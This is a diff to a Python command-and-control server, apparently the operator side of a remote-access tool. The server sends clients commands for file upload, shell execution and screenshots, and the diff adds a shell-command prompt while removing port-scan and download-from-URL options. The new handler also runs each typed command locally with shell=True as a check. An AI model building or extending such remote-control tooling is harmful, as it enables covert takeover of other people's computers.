@@ -10,6 +10,7 @@ from prettytable import PrettyTable
 import base64
 import io
 from PIL import ImageGrab , Image
+import shlex
 
 
 # A helper class that represents a client Thread
@@ -35,7 +36,6 @@ class ClientThread(threading.Thread):
                 break
             data += chunk
         try:
-            print("out")
             deserialized = json.loads(data.decode("utf-8"))
         except (TypeError, ValueError , json.decoder.JSONDecodeError) as e:
                 raise Exception('Data received was not in JSON format' + str(e))
@@ -126,9 +126,7 @@ class Server:
         self.COMMANDS = {
             1: "file_upload",
             2: "shell_exec",
-            3: "port_scan",
-            4: "dowmload_from_url",
-            5: "screenshot"}
+            3: "screenshot"}
 
         #starting the server
         self.start()
@@ -351,18 +349,10 @@ class Server:
         #case it upload_file
         if command_id == 1:
             self.upload_args(processed_arguments)
-            return processed_arguments
-        
-        input_str = input(colored("Enter Arguments (with comma-separated): \n" ,"yellow"))
-        # Split the input string into individual arguments by commas
-        arguments = input_str.split(',')
-        # Remove any arguments that are equal to "enter" or "space"
-        for argument in arguments:
-            argument = argument.strip()  # Remove leading/trailing whitespace
-            if argument.lower() not in (" ", ""):
-                processed_arguments.append(argument)
-
+        elif command_id == 2:
+            self.shell_exc_args(processed_arguments)
         return processed_arguments
+
     
 #Handle file_upload args
     def upload_args(self ,processed_arguments):
@@ -380,7 +370,18 @@ class Server:
         print(colored("Enter file name or destenation with a suffix : \n" ,"yellow"))
         name = input(colored(">>>" , "blue"))
         processed_arguments.append(name)
-        
+
+#Handle shell excution args
+    def shell_exc_args(self , processed_arguments):
+       print(colored("Enter shell command like dir / cd and etc...: \n" ,"yellow"))
+       while True:
+                input_str = input(colored(">>>" , "blue"))
+                try:
+                    subprocess.run(input_str, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    break
+                except subprocess.CalledProcessError as e:
+                    print(colored(f"Your input must be a shell command {e}, Try again.", "red")) 
+       processed_arguments.append(input_str.split())
 
 #Send data to the client    
     def _send(self, socket, data):
